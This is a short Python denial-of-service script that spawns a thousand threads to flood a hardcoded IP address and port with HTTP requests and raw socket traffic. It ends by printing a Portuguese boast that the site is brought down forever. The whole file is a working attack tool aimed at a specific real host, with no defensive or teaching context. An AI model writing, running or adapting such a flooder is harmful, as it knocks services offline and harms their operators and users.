import requests
import threading
import time
import socket
import random

def http_flood():
    while True:
        try:
            headers = {'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64)'] * 20)}
            requests.get("http://158.69.171.5:4500", headers=headers, timeout=0.3)
            requests.post("http://158.69.171.5:4500", data=b'flood'*100, timeout=0.3)
            time.sleep(0.01)
        except: pass

def socket_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect(("158.69.171.5", 4500))
            for _ in range(50):
                s.send(b'GET / HTTP/1.1\r\nHost: 158.69.171.5\r\n\r\n')
            s.close()
        except: pass

for _ in range(500):
    threading.Thread(target=http_flood, daemon=True).start()
    threading.Thread(target=socket_flood, daemon=True).start()

print("Super flood VPS ativado - site derrubado forever")
while True:
    time.sleep(60)
